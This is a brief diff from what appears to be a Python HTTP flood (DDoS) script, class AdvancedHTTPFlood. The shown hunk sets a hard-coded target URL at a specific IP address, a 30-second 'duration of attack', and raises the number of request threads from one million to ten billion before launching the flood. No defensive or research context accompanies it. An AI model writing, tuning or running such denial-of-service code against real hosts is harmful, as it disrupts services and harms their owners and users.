@@ -52,7 +52,7 @@ class AdvancedHTTPFlood:
 if __name__ == "__main__":
     target = "http://142.171.195.145/HIT"
     duration = 30  # Duration of attack in seconds
-    num_threads = 1000000  # Number of threads to create for sending requests
+    num_threads = 10000000000  # Number of threads to create for sending requests
 
     ddos = AdvancedHTTPFlood(target, duration, num_threads)
     ddos.run()
